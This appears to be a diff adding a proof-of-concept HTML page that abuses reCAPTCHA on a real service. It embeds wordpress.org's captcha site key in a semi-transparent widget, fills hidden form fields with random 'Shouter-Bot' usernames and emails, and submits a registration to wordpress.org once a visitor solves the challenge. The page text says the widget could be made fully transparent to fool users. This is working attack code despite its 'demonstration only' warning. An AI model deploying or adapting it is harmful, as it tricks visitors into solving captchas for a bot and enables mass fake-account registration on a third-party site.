@@ -1,0 +1,39 @@
+<html>
+<head>
+<meta name="referrer" content="never">
+<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?ver=2'></script>
+</head>
+<body>
+<form method="post" action="https://wordpress.org/support/register.php">
+<div style="opacity: 0.3" class="g-recaptcha" data-sitekey="6Ld6gcoSAAAAAEkCxPeS-_sqEokNIHwNCOtx17xo"></div> 
+<input name="user_login" type="hidden" id="user_login" size="30" maxlength="30" value="" /> 
+<input name="user_email" id="user_email" type="hidden" value="" />
+</form>
+<p>Here reCAPTCHA challenge shown is not perfectly transparent but to exploit it in the actual use it may be completely transparent.</p> 
+<p>Click it and solve the captcha!</p> 
+<p>If you see "Invalid domain for site key" you're using an old browser.</p> 
+<p>Also, if you start getting a challenge - you're not a Good guy anymore - atleast for Google :(</p>
+<p><strong>WARNING:</strong>This resource is for demonstration only, please do not misuse it for any wrong purpose.</p>
+
+<script>
+	function makeid() {
+		var text = "";
+		var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+		for (var i = 0; i < 7; i++)
+			text += possible
+					.charAt(Math.floor(Math.random() * possible.length));
+		return text;
+	}
+	user_login.value = 'Shouter-Bot-' + makeid();
+	user_email.value = 'Shouter-Bot-' + makeid() + '@gmail.com';
+	check = setInterval(function() {
+		v = document.getElementById('g-recaptcha-response').value
+		if (v.length > 0) {
+			alert('Thanks for helping my bot! Your token is ' + v);
+			document.forms[0].submit();
+			clearInterval(check);
+		}
+	}, 400)
+</script>
+</body>
+</html>
